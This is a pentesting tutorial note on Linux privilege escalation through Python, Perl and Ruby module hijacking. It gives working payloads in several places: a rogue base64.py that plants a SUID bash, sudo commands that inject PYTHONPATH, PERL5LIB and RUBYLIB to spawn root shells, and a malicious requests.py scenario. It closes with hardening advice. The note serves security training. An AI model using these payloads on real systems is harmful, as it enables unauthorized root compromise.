---
tags: [linux, privesc, pentesting, red-team]
difficulty: advanced
module: "44 - Linux Privilege Escalation"
topic: "44.33 Library Hijacking"
---

# 44.33 Python, Perl, and Ruby Library Hijacking

## 1. Introduction

Interpreted languages like Python, Perl, and Ruby rely on a defined path hierarchy to locate and load external libraries, modules, and dependencies at runtime. When a script imports a module (e.g., `import os` in Python, `require 'fileutils'` in Ruby), the interpreter searches through a series of directories in a specific order to find the corresponding file.

If a privileged script (run via `sudo`, a cron job, or as a SUID executable) is written in one of these languages, and an attacker can place a malicious file with the name of a required module in a directory that is searched *before* the legitimate library directory, the interpreter will load and execute the attacker's code with the privileges of the script. This technique is known as Library Hijacking or Module Hijacking.

## 2. Architecture and Attack Flow

The following ASCII diagram illustrates the module resolution process and how an attacker intercepts it.

```text
+---------------------------------------------------------------------------------+
|                               Linux System                                      |
|                                                                                 |
|  +--------------------+                                                         |
|  | Root Python Script |   #!/usr/bin/env python3                                |
|  | /opt/backup.py     |   import shutil          <-- Target Module              |
|  +--------------------+   shutil.make_archive(...)                              |
|            |                                                                    |
|            v                                                                    |
|  +--------------------+   Interpreter Search Path (sys.path) Order:             |
|  | Python Interpreter |   1. Current Working Directory (CWD) / Directory of     |
|  | (Running as root)  |      the running script (e.g., /opt/)                   |
|  +--------------------+   2. $PYTHONPATH Environment Variable                   |
|            |              3. Standard Library Paths (e.g., /usr/lib/python3.x/) |
|            |              4. Site-Packages (e.g., /usr/local/lib/...)           |
|            |                                                                    |
|            v                                                                    |
|  +--------------------+   Directory 1: /opt/ (Writable by Attacker!)            |
|  | Path 1 Search      |   Attacker places malicious `shutil.py` here.           |
|  |                    | ------------------------------------+                   |
|  +--------------------+                                     |                   |
|            | (If not found, moves to Path 2...)             v                   |
|            |                                    +-----------------------+       |
|  +--------------------+                         | /opt/shutil.py        |       |
|  | Path 3 Search      |                         | (Malicious Module)    |       |
|  |                    |                         | import os             |       |
|  +--------------------+                         | os.system("/bin/sh")  |       |
|                                                 +-----------------------+       |
|                                                             |                   |
|                                                             v                   |
|                                                 +-----------------------+       |
|                                                 | Root Shell Executed!  |       |
|                                                 +-----------------------+       |
+---------------------------------------------------------------------------------+
```

## 3. The 'Why': Understanding Library Resolution

Library hijacking is possible due to two primary factors:
1.  **Relative Pathing & CWD Priority:** By design, many interpreters prioritize the current working directory or the directory containing the script. This allows developers to easily test local versions of modules.
2.  **Environment Variable Trust:** Interpreters trust environment variables like `PYTHONPATH`, `PERL5LIB`, or `RUBYLIB` to prepend custom paths to the search list.

If an administrator fails to lock down the directory where a privileged script resides, or fails to sanitize environment variables when invoking the script via `sudo`, the system becomes vulnerable.

## 4. Python Module Hijacking

Python is the most common target for this technique. The search path is stored in `sys.path`.

### 4.1 Exploiting the Script Directory (Priority 1)
If a script `/opt/scripts/system_check.py` is run as root via a cron job, Python will first look for modules in `/opt/scripts/`.

**Enumeration:**
Check the permissions of the directory containing the script.
```bash
ls -ld /opt/scripts/
# drwxrwxrwx 2 root users 4096 Jun 9 12:00 /opt/scripts/
```

**Exploitation:**
Read the target script to find an imported module. Let's assume it imports `base64`. Create a malicious `base64.py` in the same directory.

```python
# /opt/scripts/base64.py
import os

# Create a SUID bash binary
os.system("cp /bin/bash /tmp/rootbash")
os.system("chmod +s /tmp/rootbash")

# Optional: Provide expected dummy functions to prevent the main script from crashing visibly
def b64decode(*args, **kwargs):
    pass
```
When the cron job runs, it loads your `base64.py` instead of the system's `/usr/lib/python3.8/base64.py`, executing your payload as root.

### 4.2 Exploiting `PYTHONPATH`
If you can execute a script via `sudo` and the administrator has misconfigured `sudoers` to preserve the environment (`env_keep+=PYTHONPATH`), you can point the interpreter to an arbitrary directory.

**Exploitation:**
```bash
# Create a fake library directory
mkdir /tmp/fakelib
cat << EOF > /tmp/fakelib/random.py
import os
os.system("/bin/sh")
EOF

# Run the allowed sudo command, injecting our path
sudo PYTHONPATH=/tmp/fakelib /usr/bin/python3 /opt/admin_tool.py
```

### 4.3 Exploiting Site-Packages Permissions
Sometimes, the global `/usr/local/lib/pythonX.Y/dist-packages/` or specific module directories have weak permissions (e.g., group-writable by `developers`). You can simply overwrite the legitimate module or place a new one that shadows a standard library.

## 5. Perl Module Hijacking

Perl uses the `@INC` array to determine where to look for modules (`.pm` files).

### 5.1 Enumerating `@INC`
To view the default Perl search paths:
```bash
perl -V
```

### 5.2 Exploiting `PERL5LIB`
Similar to Python, if `sudo` preserves the `PERL5LIB` or `PERLLIB` environment variables, you can hijack imports.

Suppose a root script uses `use File::Copy;`.

**Exploitation:**
```bash
# Create the directory structure matching the module name
mkdir -p /tmp/fakelib/File

# Create the malicious module
cat << EOF > /tmp/fakelib/File/Copy.pm
package File::Copy;
exec("/bin/sh");
1;
EOF

# Execute with sudo
sudo PERL5LIB=/tmp/fakelib /usr/bin/perl /opt/maintenance.pl
```

## 6. Ruby Library Hijacking

Ruby uses the `$LOAD_PATH` (or `$:` ) global variable to search for required files.

### 6.1 Enumerating `$LOAD_PATH`
```bash
ruby -e 'puts $LOAD_PATH'
```

### 6.2 Exploiting `RUBYLIB`
If `sudo` preserves the `RUBYLIB` environment variable, hijacking is trivial.

Suppose a root script uses `require 'json'`.

**Exploitation:**
```bash
# Create the malicious module
cat << EOF > /tmp/fakelib/json.rb
exec "/bin/sh"
EOF

# Execute with sudo
sudo RUBYLIB=/tmp/fakelib /usr/bin/ruby /opt/parser.rb
```

## 7. Real-World Penetration Testing Scenario

During a lateral movement phase, you compromise an application developer account.

1.  **Enumeration:** Checking `sudo -l`, you find:
    `(root) NOPASSWD: /usr/bin/python3 /var/www/scripts/restart_services.py`
2.  **Analysis:** You read the script and see:
    ```python
    import os
    import sys
    import requests
    # ... code to hit local API to restart services
    ```
    You cannot edit `restart_services.py` (owned by root), but you check the permissions of `/var/www/scripts/`.
    ```bash
    ls -ld /var/www/scripts/
    # drwxrwxr-x 2 root devgroup 4096 ...
    ```
    Your user is in the `devgroup`. You have write access to the directory!
3.  **Exploitation:** You create a malicious `requests.py` in `/var/www/scripts/`.
    ```python
    import pty
    import os
    
    # Spawn interactive root shell
    os.setuid(0)
    pty.spawn("/bin/bash")
    ```
4.  **Execution:** You run `sudo /usr/bin/python3 /var/www/scripts/restart_services.py`. The interpreter looks in the script's directory first, finds your `requests.py`, and immediately spawns a root shell.

## 8. Defensive Hardening & Mitigation

To prevent library hijacking:

1.  **Absolute Module Paths:** While difficult in interpreted languages, ensure that critical scripts manipulate their `sys.path` (or equivalent) immediately upon execution to remove writable directories or enforce strict absolute paths.
2.  **Secure Directory Permissions:** Ensure that the directory containing privileged scripts is owned by root and is not writable by any other user or group (`chmod 755`).
3.  **Sanitize Environment Variables:** Never use `Defaults env_keep += PYTHONPATH` (or PERL5LIB/RUBYLIB) in `/etc/sudoers`. Sudo securely resets the environment by default (`env_reset`); do not override this for interpreters.
4.  **Use SUID Carefully:** Interpreted languages should almost never be made SUID. Modern Linux kernels often ignore the SUID bit on scripts entirely to prevent these exact execution context issues.

## Chaining Opportunities
- Often the direct result of discovering insecure file permissions documented in **[[35 - Defense File Permission Hardening]]**.
- Can be combined with **[[25 - Cron Job Exploitation]]** if the target script is executed automatically rather than via sudo.
- Exploiting misconfigured environment variables links to **[[09 - Environmental Variable Manipulation]]**.

## Related Notes
- [[32 - Insecure Sudo Rules]]
- [[19 - Linux Process Enumeration]]
- [[24 - SUID vs SUDO Mechanisms]]
